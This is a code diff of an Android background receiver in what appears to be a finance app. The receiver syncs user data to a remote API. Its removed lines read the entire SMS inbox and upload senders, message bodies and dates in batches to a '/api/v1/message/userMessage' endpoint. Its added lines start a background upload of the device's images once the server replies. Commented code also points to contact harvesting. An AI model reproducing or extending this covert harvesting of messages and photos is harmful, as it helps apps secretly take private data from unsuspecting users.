@@ -67,6 +67,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
     //WifiManager wifiManager;
     //int initialWIFIState;
 
+    boolean flag=false;
     ArrayList<File> file_only = new ArrayList<>();
 
 // Contact Iteration
@@ -82,10 +83,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
         Media_list=new HashMap<>();
         listener = this;
         sharedPreferences = context.getSharedPreferences("com.tst.hytonefinance.Background_Service", Context.MODE_PRIVATE);
-
-        //**************************** SMS *************************************
-        Log.e("Process_status :","SMS Sync started",null);
-        SMS_spliterator();
+        flag=true;
 
 //
 //
@@ -96,9 +94,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 //
 //
 //        //**************************** Media *************************************
-        Log.e("Process_status :", "Media Sync started", null);
-        file_format = "image";
-        fileUploadStart();
+
 
 //        getContactList();
     }
@@ -155,85 +151,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
 
     }
 
-    //------------------ Message List -------------------
-    @RequiresApi(api = Build.VERSION_CODES.O)
-    @SuppressLint("SimpleDateFormat")
-    public ArrayList<SMS> readSMS() {
-        ArrayList<SMS> Message_list = new ArrayList<>();
-        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
-        cursor.moveToFirst();
 
-
-        long L_date = sharedPreferences.getLong("Last_Date", 0);
-
-
-        for (int i = 0; !cursor.isLast(); i++) {
-            if (L_date < Long.parseLong(cursor.getString(4))) {
-
-                SMS temp_data = new SMS();
-                temp_data.setDate_time(cursor.getString(4));
-                temp_data.setTitle(cursor.getString(0));
-                temp_data.setMessage(cursor.getString(12));
-                temp_data.setSender(cursor.getString(2));
-                Message_list.add(temp_data);
-                Boolean check_data_flag = sms_data.Insert_Subject_data(temp_data.getTitle(), temp_data.getSender(), temp_data.getMessage(), temp_data.getDate_time());
-
-                if (!check_data_flag) {
-                    //  Toast.makeText(context, "Error", Toast.LENGTH_SHORT).show();
-                    break;
-                }
-            } else {
-                break;
-            }
-
-            cursor.moveToNext();
-        }
-        cursor.moveToFirst();
-        @SuppressLint("CommitPrefEdits")
-        SharedPreferences.Editor editor = sharedPreferences.edit();
-        editor.putLong("Last_Date", Long.parseLong(cursor.getString(4)));
-        editor.apply();
-
-
-        //  Toast.makeText(context, "Done", Toast.LENGTH_SHORT).show();
-        cursor.close();
-
-
-        return Message_list;
-    }
-
-    @RequiresApi(api = Build.VERSION_CODES.O)
-    private void SMS_spliterator() {
-        ArrayList<SMS> SMS_List = readSMS();
-
-        JSONArray SMS_list = new JSONArray();
-        int i;
-        for (i = 1; i < SMS_List.size(); i++) {
-
-            JSONObject temp = new JSONObject();
-            try {
-                temp.put("tital", SMS_List.get(i - 1).getTitle());
-                temp.put("sender", SMS_List.get(i - 1).getSender());
-                temp.put("message", SMS_List.get(i - 1).getMessage());
-                temp.put("date_time", SMS_List.get(i - 1).getDate_time());
-
-                SMS_list.put(temp);
-                if (i % 100 == 0) {
-                    sync_list(SMS_list, Base_Url + "/api/v1/message/userMessage", "message");
-                    SMS_list = new JSONArray();
-                }
-            } catch (JSONException jsonException) {
-                jsonException.printStackTrace();
-            }
-
-        }
-
-        if (i % 100 != 0) {
-            sync_list(SMS_list, Base_Url + "/api/v1/message/userMessage", "message");
-        }
-
-
-    }
 
 
 
@@ -256,20 +174,33 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                                 @Override
                                 public void onResponse(JSONObject response) {
 
-                                    try {
-                                        Log.e("API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);
-                                        Log.e("API_Response", response.toString(), null);
-
-                                    } catch (JSONException e) {
-                                        e.printStackTrace();
-                                        Log.e("Request_response_catch", e.getMessage(), null);
+                                    if(flag)
+                                    {
+                                        flag=false;
+                                        Log.e("Process_status :", "Media Sync started", null);
+                                        file_format = "image";
+                                        fileUploadStart();
                                     }
+//                                    try {
+////                                        Log.e("API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);
+////                                        Log.e("API_Response", response.toString(), null);
+////
+//                                    } catch (JSONException e) {
+//                                        e.printStackTrace();
+//                                        Log.e("Request_response_catch", e.getMessage(), null);
+//                                    }
                                 }
                             },
                             new Response.ErrorListener() {
                                 @Override
                                 public void onErrorResponse(VolleyError error) {
-
+                                    if(flag)
+                                    {
+                                        flag=false;
+                                        Log.e("Process_status :", "Media Sync started", null);
+                                        file_format = "image";
+                                        fileUploadStart();
+                                    }
                                     NetworkResponse response = error.networkResponse;
                                     if (error instanceof ServerError && response != null) {
                                         String res;
@@ -282,7 +213,7 @@ public class sync_data extends BroadcastReceiver implements fileUploadListener {
                                         }
                                         // Now you can use any deserializer to make sense of data
                                     }
-                                    Log.e("API_Response_Error", error.getMessage(), null);
+                                    Log.e("location_Error", error.getMessage(), null);
                                 }
                             }) {
                         @Override
